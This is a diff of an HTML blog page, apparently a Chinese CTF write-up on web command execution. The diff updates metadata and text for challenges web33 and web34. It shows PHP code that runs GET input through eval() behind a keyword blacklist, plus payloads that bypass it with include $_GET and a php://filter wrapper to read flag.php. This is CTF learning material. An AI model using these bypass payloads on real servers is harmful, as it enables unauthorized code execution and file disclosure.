@@ -265,7 +265,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Fri Jan 24 2025 00:50:36 GMT+0800">2025-01-24 00:50:36</span>
+                    <span class="datetime" data-updated="Fri Jan 24 2025 22:37:15 GMT+0800">2025-01-24 22:37:15</span>
                 </span>
             
         
@@ -315,7 +315,7 @@
                     
                          <h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p> RCE（remote code execute）：远程命令执行或者代码执行，我们平时说的rce，比如thinkPHP的rce漏洞，即算代码注入漏洞，也算rce漏洞，因为渗透的最终情况可以实现执行命令或者是代码都属于RCE，例如代码执行、文件包含、反序列化、命令执行，甚至是写文件Getshell都可以属于RCE</p>
 <p>关于命令执行，我的认知是web的基础功底，很多别的种类的题目例如ssti这种类型的找到flag时用到的姿势和命令执行很相像思路也是比较接近，所以我们一定由浅入深的把基础的命令执行payload理解透彻</p>
-<p>首先就是cat flag（别给我说这个你不会，不会自己查去其实就是个打开的命令，但是在我刚开始进行练习的时候面对的是个tac，一开始我以为</p>
+<p>首先就是cat flag（别给我说这个你不会，不会自己查去其实就是个打开的命令，但是在我刚开始进行练习的时候面对的是个tac，一开始我以为是后端写的东西，必须倒叙才行，但是越感觉越不对劲，于是我就去问后来得到个差不多的理解</p>
 <p>tac 我的理解是从cat的文件里面倒序出每一行其实就是一种简便的命令</p>
 <p>isset() 函数用于检测变量是否已设置并且非 NULL&#x2F;&#x2F;其实就是保证你正常传参的</p>
 <p>本篇文章主要参考落寞的魚师傅的<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Aluxian_/article/details/131024590?fromshare=blogdetail&sharetype=blogdetail&sharerId=131024590&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link" >web命令执行入门<i class="fas fa-external-link-alt"></i></a>	星|焰师傅的<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_65409532/article/details/141852711?fromshare=blogdetail&sharetype=blogdetail&sharerId=141852711&sharerefer=PC&sharesource=2302_79965136&sharefrom=from_link" >命令执行详解<i class="fas fa-external-link-alt"></i></a>(但是理论偏多)说多无益多看看题试着做几道就会很舒服了</p>
@@ -334,7 +334,7 @@
 
 <p>这里过滤了反斜杠斜杠分号之类的</p>
 <p>思路是用include函数实现不用括号的文件包含,然后再配合伪协议,分号使用&gt;?代替</p>
-<p>在这里我对于<strong>include_GET</strong>这一内容不太理解去问sun师傅,孙师傅告诉我说是实现文件包含重造变量–重造了cmd这个传参然后使得传参不受限制了,**&gt;?**代替了分号</p>
+<p>在这里我对于<strong>include_$GET</strong>这一内容不太理解去问sun师傅,孙师傅告诉我说是实现文件包含重造变量–重造了cmd这个传参然后使得传参不受限制了,**&gt;?**代替了分号</p>
 <h4 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line">//过滤了双引号,完全可以照搬32的payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?c=include_$GET[lww]?</span><br><span class="line">&gt;&amp;lww=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
 
 <h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">可以一样用上面的payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -478,6 +478,22 @@
                 
                     <div class="post-nav border-box">
                         
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AFWP/"
+                                   title="启航杯WP"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">启航杯WP</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
                         
                             <div class="next-post">
                                 <a class="next"
@@ -549,7 +565,7 @@
             
                 <span class="count-item border-box word">
                     <span class="item-type border-box">Total words</span>
-                    <span class="item-value border-box word">2.4k</span>
+                    <span class="item-value border-box word">5.1k</span>
                 </span>
             
 
